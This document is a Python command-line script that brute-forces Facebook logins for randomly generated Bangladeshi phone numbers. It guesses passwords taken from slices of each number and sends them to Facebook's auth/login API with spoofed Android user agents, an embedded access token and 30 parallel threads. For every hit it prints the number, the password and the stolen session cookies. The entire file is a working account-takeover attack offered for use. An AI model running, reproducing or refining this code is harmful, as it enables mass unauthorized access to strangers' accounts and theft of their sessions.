import os, random, string, sys, uuid, json, requests
from concurrent.futures import ThreadPoolExecutor as imran
#__________COLOURS___________#
#__________CLEAR_____________#
def flash():os.system('clear');print(logo)
#____________LOOPS____________#
loop=0
user=[]
ok=[]
#____________UGEN_____________#
def ______UaXd______():
   vivocode=random.choice(["1906","1814","1820","1812","1920","1904","1811","1901","2015","2004","1610","1609","1601"])
   mobileverson=random.choice(["7","8","9","10","11"])
   ua="[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/"+str(random.choice(range(70,400)))+".0.0."+str(random.choice(range(9,59)))+"."+str(random.choice(range(60,200)))+";FBBV/"+str(random.choice(range(111111111,999999999)))+";FBDM/{density=2.0,width=720,height=1406};FBLC/en_US;FBRV/"+str(random.choice(range(111111111,999999999)))+";FBCR/;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;"+f"FBDV/vivo {vivocode};FBSV/{mobileverson};FBOP/1;FBCA/arm64-v8a:;]"
   return ua
#____________LINE______________#
def line():print(20*'<=>')
#____________LOGO_____________#
logo = '''▌ ▌▞▀▖▙▗▌▛▀▖▜▘▛▀▖▛▀▘
▚▗▘▙▄▌▌▘▌▙▄▘▐ ▙▄▘▙▄
▝▞ ▌ ▌▌ ▌▌  ▐ ▌▚ ▌
 ▘ ▘ ▘▘ ▘▘  ▀▘▘ ▘▀▀▘'''
#_____________MENU_____________#
def Main():
    flash()
    print(f' [1] RANDOM ')
    print(f' [2] EXIT ')
    line()
    a = input(f' CHOICE : ')
    if a == '1':
        BANGLADESH()
    elif a == '2':
        exit(f' THANKS FOR USING DEAR ')
    else:
        exit(f' SORRY YOU HAVE NOT SELECTED ANY OPTION ')
#___________MAIN-DRF__________#
def BANGLADESH():
    flash()
    print(f' SIM CODE : 017 / 018 / 019 ');line()
    code = input(f' CHOICE CODE : ');flash()
    print(f' LIMIT EX : 1000 / 2000 ');line()
    limit = int(input(f' LIMIT : '));flash()
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with imran(max_workers=30) as Imran:
        for sexy in user:
            uid = code+sexy
            paslist = [uid[5:],uid[4:],uid[3:],uid[2:],uid[1:],uid[0:],uid[:6],uid[:7],uid[:8],uid[:9],uid[:10]]
            Imran.submit(method,uid,paslist)
#___________METHOD___________#
def method(uid,paslist):
    global loop,ok
    sys.stdout.write(f'\r %s|OK:%s'%(loop,len(ok))),sys.stdout.flush()
    for pxs in paslist:
        head = {
            'Host': 'mbasic.facebook.com',
            'User-Agent': ______UaXd______(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://mbasic.facebook.com',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "register_api",
            "email": uid,
            "password": pxs,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"
        }
        try:
            IMRAN=requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
            if 'session_key' in IMRAN:
                coki=";".join(i["name"]+"="+i["value"] for i in IMRAN["session_cookies"])
                print(f'\r [OK] => '+uid+'|'+pxs+'\n [COOKIE] => '+coki+'')
                ok.append(uid)
                break
            elif 'www.facebook.com' in IMRAN:
                print(f'\r [CP] => '+uid+'|'+pxs+'')
                break
            else:continue
        except Exception as e:
            pass
    loop += 1
#___________END-CALL__________#
Main()